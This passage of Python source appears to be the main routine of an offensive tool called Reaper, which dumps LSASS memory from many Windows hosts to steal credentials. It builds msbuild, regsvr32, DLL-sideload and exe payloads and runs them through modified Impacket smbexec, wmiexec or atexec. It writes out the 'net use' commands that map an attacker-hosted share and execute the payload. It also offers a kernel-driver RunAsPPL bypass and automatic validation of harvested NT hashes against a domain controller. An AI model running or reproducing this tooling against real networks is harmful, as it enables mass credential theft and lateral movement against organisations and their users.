    parser = argparse.ArgumentParser(add_help=True, description='', epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  Payloads are formatted in execmode-payloadtype\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs\n  Payloads ending in mdwd use a simple MiniDumpWriteDump function to dump lsass\n  Payloads ending in mdwdpss use PssCaptureSnapshot to copy lsass memory to a new process and dump that with MiniDumpWriteDump\n  Payloads ending in rtlcp use RtlCreateProcessReflection to copy lsass memory to a new process and dump that with MiniDumpWriteDump', formatter_class=RawTextHelpFormatter)
    if '-oe' not in sys.argv and '-relayx' not in sys.argv:  # if were using another exec method we dont need to get target
        parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr, filename>')
    parser.add_argument('-share', action='store', default='C$', choices=['C$', 'ADMIN$'], help='share where the output will be grabbed from (default C$ for smbexec and wmiexec) (wmiexec and smbexec ONLY)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-l', '--loot-dir', action='store', default=cwd, help='Directory to place the "loot" folder in Default=Reapers Dir')
    parser.add_argument('-sku', action='store_true', help='Skips the update check (good for if you do not have internet and dont want to wait for it to timeout)')
    parser.add_argument('-oe', action='store_true', default=False, help='"Other Exec" Pause just before the execution of the payload (Good for when you want to execute the payload using other methods eg crackmapexec\'s -x)')
    parser.add_argument('-relayx', action='store_true', help='Use ntlmrelayx relays for authentication')
    parser.add_argument('-ap', action='store_true', default=False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
    parser.add_argument('-av', action='store_true', default=False, help='Turn auto validation of found accounts ON this will try to authenticate to a domain controller using any usernames and NT hashes that were found (Requires -ap)')
    parser.add_argument('-sh', action='store_true', default=False, help='Skips any hosts that have been previously attacked. (Stored in hist file)')
    parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
    parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
    parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
    parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
    parser.add_argument('-payload', '-p', action='store', default='exe-mdwdpss', choices=['msbuild', 'regsvr32-mdwdpss', 'regsvr32-mdwd', 'dllsideload-mdwdpss', 'dllsideload-mdwd', 'exe-mdwdpss', 'exe-mdwd', 'exe-rtlcp', 'regsvr32-rtlcp', 'dllsideload-rtlcp'], help='Choose a payload type')
    parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
    parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
    parser.add_argument('-runasppl', action='store_true', default=False, help='Attempts to bypass RunAsPPL Only compatable with the exe-rtlcp payload(WARNING THIS USES A SYSTEM DRIVER AND INTERACTS AT A KERNEL LEVEL DO NOT USE IN PROD)')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME, help='The name of the service used to trigger the payload (SMBEXEC only)')

    parser.add_argument('-sharename', action='store', help='Set the name of the attacker share Default=random')
    parser.add_argument('-shareuser', action='store', help='Set the username of the user for the share Default=random')
    parser.add_argument('-sharepassword', action='store', help='Set the password for shareuser Default=random')
    parser.add_argument('-sharegroup', action='store', help='Set the group for shareuser Default=random')

    group = parser.add_argument_group('authentication')
    group.add_argument('-localauth', action='store_true', default=False, help='Authenticate with a local account to the machine')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH or just NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                      "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    apt_package_chk(options.payload)

    if options.debug:
        lognoprint('{}Command:{} '.format(color_PURP, color_reset) + ' '.join(sys.argv) + '\n')

    if options.relayx and options.oe == False:
        options.oe = True

    if options.loot_dir.endswith('/'):
        options.loot_dir = options.loot_dir[:-1]

    if os.path.isdir('{}/loot'.format(options.loot_dir)) == False:
        try:
            os.makedirs('{}/loot'.format(options.loot_dir))
        except Exception:
            print('There is an error with your loot dir "{}"'.format(options.loot_dir))

    # Init the example's logger theme
    logger.init(options.ts)

    #if '-share' not in sys.argv and options.method == 'wmiexec':  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
        #options.share = 'ADMIN$' # ADMIN$ has been getting flaged as malware with wmiexec so moving it to default to C$

    if options.payload == 'msbuild' or options.payload.endswith('mdwd'):
        yon = input('\n{}WARNING{}: the mdwd payloads used in msbuild and ones ending with -mdwd have caused the Windows OS to crash/hang indefinitely are you sure you wish to continue? (y/N): '.format(color_RED, color_reset))
        if yon.lower() == 'n':
            print('Exiting')
            sys.exit(0)

    if options.method == 'smbexec' or options.relayx: # smbexec required smbexec-shellless to work right
        if os.path.isfile('{}/smbexec-shellless.py'.format(cwd)) == False:
            print('Error you are missing {}/smbexec-shellless.py go get it from github'.format(cwd))
            sys.exit(1)

    if options.runasppl and options.method == 'atexec':  # check to see if they are trying to run runasppl bypass with something other than smbexec or wmiexec
        printnlog('{}[!]{} RunAsPPL Bypass only works with the SMBExec method'.format(color_RED, color_reset))
        sys.exit(0)

    runaspplpayloads = ['msbuild', 'exe-rtlcp', 'dllsideload-rtlcp']

    if options.runasppl and options.payload not in runaspplpayloads:  # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
        printnlog('{}[!]{} RunAsPPL Bypass only works with the msbuild, exe-rtlcp, and dllsideload-rtlcp payloads'.format(color_RED, color_reset))
        sys.exit(0)

    if options.runasppl:
        if options.debug == False:
            printnlog('I HIGHLY recommend turning on -debug')
        plzno = input('{}[!]{} RunAsPPL Bypass uses a kernel driver which theoretically can cause a BSOD are you absolutely sure you want to use this? Also this only works every other time (y/N): '.format(color_YELL, color_reset))
        if plzno.lower() != 'y':
            sys.exit(0)

    if options.payload.find('dllsideload') != -1 and options.method == 'wmiexec':
        cont = input('{}[!]{} Warning you are attempting to run dllsideload via wmiexec which will work, however it will hang until timeout do you want to (c)ontinue, (n)o exit, or (y)es switch to smbexec: '.format(color_YELL, color_reset))
        if cont.lower() == 'n':
            sys.exit(0)
        elif cont.lower() == 'y':
            options.method = 'smbexec'

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error('Wrong COMVERSION format, use dot separated integers e.g. "5.7"')
            sys.exit(1)

    if '-oe' in sys.argv or '-relayx' in sys.argv:
        options.target = 'eriujf/eriuhe:\'rguire\'@1'

    domain, username, password, address = parse_target(options.target)

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (
                repr(domain), repr(username), repr(password)))

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass('Password:')

        if options.aesKey is not None:
            options.k = True

        if options.drive is not None and options.drive.isalpha() and len(options.drive) == 1:  # did we get a drive letter?
            drive_letter = str(options.drive).upper()
        else:
            drive_letter = 'Q'

        if options.hashes is not None and options.hashes.find(':') == -1:  # quick check to prevent formatting error with hashes
            options.hashes = ':{}'.format(options.hashes)

        if options.ip is not None:  # did they give us the local ip in the command line
            local_ip = options.ip
            ifaces = ni.interfaces()
            iface_ips = []

            for face in ifaces:  # get all interface ips
                try:
                    iface_ips.append(ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
                except BaseException as exc:
                    continue

            try:  # check to see if the interface has an ip
                if local_ip in ifaces:  # if the given ip is one of our interfaces eg. eth0 ,ensp01
                    local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])  # get the ip address of the interface
                    printnlog("local IP => {}\n".format(local_ip))
                elif local_ip in iface_ips:  # if they gave us an ip address for -ip eg 10.10.10.10 this ensures that it is our IP were binding to
                    printnlog("local IP => {}\n".format(local_ip))
                else:  # if they gave us something incorrect/weird
                    printnlog('The interface or IP you specified does not belong to the local machine')
                    sys.exit(0)
            except SystemExit:
                sys.exit(0)
            except BaseException as exc:  # if the given interface has no ip we end up here
                printnlog('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
                sys.exit(0)
        else:  # no -ip in options
            # print local interfaces and ips
            ifaces = ni.interfaces()  # get all interfaces
            iface_ips = []

            for face in ifaces:  # get the ip for each interface that has one
                try:
                    iface_ips.append(ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
                except BaseException as exc:
                    continue

            for face in ifaces:
                try:  # check to see if the interface has an ip
                    printnlog('{} {}'.format(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr']))  # print(interface:      IP)
                except BaseException as exc:
                    continue

            local_ip = input("\nEnter you local ip or interface: ")  # what do they want for their interface

            # lets you enter eth0 as the ip
            try:  # check to see if the interface has an ip
                if local_ip in ifaces:  # if they gave us an interface eg eth0 or ensp01 ensure its ours
                    local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                    printnlog("local IP => {}\n".format(local_ip))
                elif local_ip in iface_ips:  # if they gave us an ip ensure its ours
                    printnlog("local IP => {}\n".format(local_ip))
                else:  # if they gave us something incorrect/weird
                    printnlog('The interface or IP you specified does not belong to the local machine')
                    sys.exit(0)
            except SystemExit:
                sys.exit(0)
            except BaseException as exc:  # if they give an interface that has no IP we end up here
                printnlog('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
                sys.exit(0)

        port445_check(local_ip)  # check if port 445 is in use

        if '-oe' not in sys.argv and '-relayx' not in sys.argv:  # why scan if we not gonna do anything
            addresses = do_ip(address, local_ip)  # gets a list of up hosts

            if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
                printnlog('{}[!]{} There are no targets up or the provided list is empty.'.format(color_RED, color_reset))
                sys.exit(0)

            if os.path.isfile('{}/hist'.format(cwd)):
                if options.sh:
                    with open('{}/hist'.format(cwd), 'r') as f:  # read this history file to an array
                        history_ips = f.readlines()
                        f.close()
                    history_ips_cleaned = []
                    for item in history_ips:  # remove \r and \n
                        item = item.replace("\r", "")
                        history_ips_cleaned.append(item.replace("\n", ""))

                    skipped_count = 0
                    ips_to_remove = []
                    for currip in addresses:
                        if currip in history_ips_cleaned:
                            ips_to_remove.append(currip)  # need to pass it to an array first because if we just remove from the array we will skip every other one
                            skipped_count += 1

                    if skipped_count > 0:  # first check to see if we did get any to remove if so remove them from addresses
                        for eachip in ips_to_remove:
                            addresses.remove(eachip)

                    printnlog('{}[+]{} Skipped {} hosts from history'.format(color_BLU, color_reset, skipped_count))
                    lognoprint('Skipped hosts: {}'.format(ips_to_remove))

            with open('{}/hist'.format(cwd), 'a') as f:
                for currip in addresses:
                    f.write(currip + '\n')

            if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
                printnlog('{}[!]{} There are no targets up or the provided list is empty or you skipped all of the targets from previous history.'.format(color_RED, color_reset))
                sys.exit(0)

            if len(addresses) > 500:  # ensure that they dont waste over 25 gb of storage
                printnlog('\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? '.format(str(len(addresses)), str((len(addresses) * 52) / 1024)))
                choice = input("(N/y): ")
                if choice.lower() == 'n':
                    sys.exit(0)

        share_name, share_user, share_pass, payload_name, share_group = setup_share()  # creates and starts our share
        printnlog('\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n'.format(share_name, share_user, share_pass))

        # automatically find the best drive to use
        if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False and options.relayx == False:
            drive_letter = auto_drive(addresses, domain)

        if options.oe or options.relayx:  # This is so that if you are using -oe the payload has an address in the file that it checks for the output naming convention of hotname-ip.dmp otherwise it will error
            addresses = ['23423.5463.1234.3465']

        if options.payload == 'msbuild':
            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses, options.runasppl)  # creates the payload
        elif options.payload == 'regsvr32-mdwdpss':
            addresses_file = gen_payload_regsvr32_pss(share_name, payload_name, addresses)
        elif options.payload == 'exe-mdwdpss':
            gen_payload_exe_pss(share_name, payload_name, addresses, drive_letter)
        elif options.payload == 'dllsideload-mdwdpss':
            gen_payload_dllsideload_pss(share_name, addresses)
        elif options.payload == 'exe-mdwd':
            gen_payload_exe_mdwd(share_name, payload_name, addresses, drive_letter)
        elif options.payload == 'dllsideload-mdwd':
            gen_payload_dllsideload_mdwd(share_name, addresses)
        elif options.payload == 'regsvr32-mdwd':
            addresses_file = gen_payload_regsvr32_mdwd(share_name, payload_name, addresses)
        elif options.payload == 'exe-rtlcp':
            gen_payload_exe_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
        elif options.payload == 'regsvr32-rtlcp':
            gen_payload_regsvr32_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
            addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25))) # the rtlcp payloads do not use an addresses file, however regsvr32 expects one as an argument so we make one up.
        elif options.payload == 'dllsideload-rtlcp':
            gen_payload_dllsideload_rtlcp(share_name, drive_letter, options.runasppl)

        if not options.oe:
            printnlog('\n[This is where the fun begins]\n{} Executing {} via {}\n'.format(green_plus, options.payload, options.method))

        cleanup = ''
        if options.runasppl: # append the cleanup command
            cleanup += r'&& {}:\cleanup.bat '.format(drive_letter)

        if options.payload == 'msbuild':
            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
        elif options.payload == 'regsvr32-mdwdpss' or options.payload == 'regsvr32-mdwd' or options.payload == 'regsvr32-rtlcp':
            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, cleanup, drive_letter)
        elif options.payload == 'exe-mdwdpss' or options.payload == 'exe-mdwd' or options.payload == 'exe-rtlcp':
            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, cleanup, drive_letter)
        elif options.payload == 'dllsideload-mdwdpss' or options.payload == 'dllsideload-mdwd' or options.payload == 'dllsideload-rtlcp':
            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, cleanup, drive_letter)

        printnlog(command)
        printnlog('')

        if options.oe:
            alt_exec(options.relayx, command)

        printnlog('Total targets: {}'.format(len(addresses)))
        # multithreading yeah
        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
            count = 1
            for ip in addresses:

                if options.localauth:
                    domain = ip
                try:
                    out = thread_exe.schedule(mt_execute, (ip, count,), timeout=options.timeout)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback

                        traceback.print_exc()
                    lognoprint(str(e) + '\n')
                    logging.error(str(e))
                    continue
                except KeyboardInterrupt as e:
                    continue

                count += 1

        time.sleep(2)
        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))

        # for when you're attacking a lot of targets to quickly see how many we got
        printnlog('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(options.loot_dir, timestamp)), '*.dmp')), len(addresses)))

        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
            os.system('sudo rm {}/drives.txt'.format(cwd))

        dumped_hosts = glob.glob('{}/loot/{}/*.dmp'.format(options.loot_dir, timestamp))  # gets a list of all the .dmp file names within the output dir
        dumped_hosts_fin = []
        for item in dumped_hosts:
            dumped_hosts_fin.append(item[item.rfind('/') + 1:item.rfind('.')])  # this substring should make the filename hostname-ip only
        with open('{}/loot/{}/dumped_hosts.txt'.format(options.loot_dir, timestamp), 'w') as f:  # writes the list to a file
            for host in dumped_hosts_fin:
                f.write(host + '\n')
            f.close()

        if options.ap:
            auto_parse()
        printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, options.loot_dir, timestamp, color_reset))

    except KeyboardInterrupt as e:
        logging.error(str(e))
        printnlog('\n{}[!]{} Cleaning up please wait'.format(color_YELL, color_reset))

        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
            os.system('sudo rm {}/drives.txt'.format(cwd))

        try:
            os.system('sudo service smbd stop')
            printnlog(green_plus + ' Stopped the smbd service')
        except BaseException as e:
            pass

        try:
            os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
            printnlog(green_plus + ' Cleaned up the smb.conf file')
        except BaseException as e:
            pass

        try:
            os.system('sudo rm ' + cwd + '/smb.conf')
        except BaseException as e:
            pass

        try:
            os.system('sudo userdel ' + share_user)
            printnlog(green_plus + ' Removed the user: ' + share_user)
        except BaseException as e:
            pass

        try:
            os.system('sudo groupdel ' + share_group)
            printnlog(green_plus + ' Removed the group: ' + share_group)
        except BaseException as e:
            pass

        try:
            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, options.loot_dir, timestamp))
            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, options.loot_dir, timestamp, color_reset))
        except BaseException as e:
            pass

        try:
            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
        except BaseException as e:
            pass

        print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
        sys.exit(0)

    printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    try:
        os.system('sudo service smbd stop')
        printnlog(green_plus + ' Stopped the smbd service')
    except BaseException as e:
        pass

    try:
        os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
        printnlog(green_plus + ' Cleaned up the smb.conf file')
    except BaseException as e:
        pass

    try:
        os.system('sudo rm ' + cwd + '/smb.conf')
    except BaseException as e:
        pass

    try:
        os.system('sudo userdel ' + share_user)
        printnlog(green_plus + ' Removed the user: ' + share_user)
    except BaseException as e:
        pass

    try:
        os.system('sudo groupdel ' + share_group)
        printnlog(green_plus + ' Removed the group: ' + share_group)
    except BaseException as e:
        pass

    try:
        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, options.loot_dir, timestamp))
    except BaseException as e:
        pass

    print('{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
    sys.exit(0)
